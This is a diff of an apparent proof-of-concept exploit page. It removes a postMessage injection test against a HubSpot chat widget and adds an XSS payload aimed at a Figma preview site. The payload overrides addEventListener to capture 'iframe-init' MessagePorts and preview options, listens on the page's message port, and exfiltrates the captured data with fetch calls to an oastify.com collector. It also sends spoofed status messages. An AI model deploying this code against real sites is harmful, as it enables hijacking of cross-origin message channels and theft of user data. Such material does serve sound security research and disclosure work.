@@ -1,31 +1,38 @@
-  <!-- hosted at https://majdch22.github.io -->
-  <iframe id="w"
-    src="https://app.hubspot.com/conversations-visitor/146256700/threads/utk/anytoken?url=https://majdch22.github.io"
-  ></iframe>
+<script>
+● // Proof of execution
+  alert('XSS on figmaiframepreview.figma.site - payload loaded!')
 
-  <div id="log"></div>
+  // Override addEventListener to catch next iframe-init and grab both ports
+  const _origAEL = window.addEventListener.bind(window)
+  window.addEventListener = function(type, handler, ...args) {
+    if (type === 'message') {
+      _origAEL(type, function(e) {
+        if (e.data?.type === 'iframe-init' && e.ports?.length) {
+          window._port0 = e.ports[0]
+          window._port1 = e.ports[1]
+          alert('iframe-init intercepted! port0=' + !!e.ports[0] + ' port1=' + !!e.ports[1])
+          fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/ports?p0=' + !!e.ports[0] + '&p1=' + !!e.ports[1])
+          fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/options?data=' +
+  encodeURIComponent(JSON.stringify(e.data.previewIframeInitialOptions || {})))
+        }
+        handler.call(this, e)
+      }, ...args)
+    } else {
+      _origAEL(type, handler, ...args)
+    }
+  }
 
-  <script>
-  const log = s => document.getElementById('log').innerHTML += '<br>' + s;
+  // Grab current port0
+  window._port0 = window.messagePort
+  if (window.messagePort) {
+    window.messagePort.onmessage = (e) => {
+      fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/port0msg?d=' +
+  encodeURIComponent(JSON.stringify(e.data)))
+    }
+    window.messagePort.postMessage({data: {method: 'status', state: 'ready', isReady: true}})
+  }
 
-  // Step 1: Listen for ANY message coming back from the widget
-  // The widget sends window.parent.postMessage(..., "*") so we receive everything
-  window.addEventListener('message', e => {
-    if (!e.origin.includes('hubspot')) return;
-    log('✅ RECEIVED from widget: origin=' + e.origin + ' data=' +
-        JSON.stringify(e.data).substring(0, 200));
-  });
 
-  // Step 2: Send injected message once iframe loads
-  document.getElementById('w').addEventListener('load', () => {
-    log('iframe loaded, sending...');
-
-    // Test with REQUEST_OPEN (harmless, visually verifiable)
-    document.getElementById('w').contentWindow.postMessage(
-      JSON.stringify({ type: 'REQUEST_OPEN', data: {} }),
-      '*'   // must use * because HubSpot's iframe is cross-origin
-    );
-
-    log('message sent — watch iframe for widget opening');
-  });
   </script>
+
+  fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/alive?t=' + Date.now())
